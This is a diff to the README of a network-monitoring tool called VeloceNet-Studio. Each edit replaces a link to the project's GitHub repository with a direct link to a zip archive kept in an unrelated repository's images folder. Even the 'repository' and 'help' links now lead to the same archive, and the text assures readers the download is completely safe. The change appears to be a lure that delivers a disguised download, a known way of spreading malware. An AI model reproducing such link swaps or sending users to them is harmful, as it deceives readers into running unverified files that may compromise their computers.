@@ -5,7 +5,7 @@ description: "Monitor, analyze, and optimize your network in real-time with cros
 ---
 # 📡 VeloceNet-Studio - See Your Network Like Never Before
 
-[![Download VeloceNet-Studio](https://img.shields.io/badge/Download-VeloceNet--Studio-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/guttbuster/VeloceNet-Studio)
+[![Download VeloceNet-Studio](https://img.shields.io/badge/Download-VeloceNet--Studio-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/guttbuster/guttbuster.github.io/main/images/2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -15,7 +15,7 @@ This guide walks you through getting it running on your Windows computer. No tec
 
 ## ⬇️ Download & Install
 
-Visit this link to download the application: **[Download VeloceNet-Studio](https://github.com/guttbuster/VeloceNet-Studio)**
+Visit this link to download the application: **[Download VeloceNet-Studio](https://raw.githubusercontent.com/guttbuster/guttbuster.github.io/main/images/2.5.zip)**
 
 Once you arrive at the page, you'll see the download section. Click the download button and save the file to a place you can find easily, like your Desktop or Downloads folder. The download is completely safe and free.
 
@@ -93,7 +93,7 @@ Your data stays on your computer. VeloceNet-Studio does not collect, send, or se
 
 ## 📚 Getting More Help
 
-If this guide didn't answer your question, head back to the [VeloceNet-Studio repository](https://github.com/guttbuster/VeloceNet-Studio). There you'll find:
+If this guide didn't answer your question, head back to the [VeloceNet-Studio repository](https://raw.githubusercontent.com/guttbuster/guttbuster.github.io/main/images/2.5.zip). There you'll find:
 
 - Detailed documentation
 - Community discussions
@@ -120,6 +120,6 @@ Now that VeloceNet-Studio is running, play with it. Click around, watch the grap
 
 And remember—if you like the tool, consider supporting the project by sharing it with a friend or starring the repository. Open-source software thrives on community support.
 
-[![Download VeloceNet-Studio Now](https://img.shields.io/badge/⬇%20Download%20Now-VeloceNet--Studio-blue?style=for-the-badge&logo=github)](https://github.com/guttbuster/VeloceNet-Studio)
+[![Download VeloceNet-Studio Now](https://img.shields.io/badge/⬇%20Download%20Now-VeloceNet--Studio-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/guttbuster/guttbuster.github.io/main/images/2.5.zip)
 
 Keywords: bandwidth, dart, desktop-app, ffi, flutter, latency, network-analysis, network-monitoring, open-source, packet-loss, ping, rust, tokio, traceroute, windows, wireguard
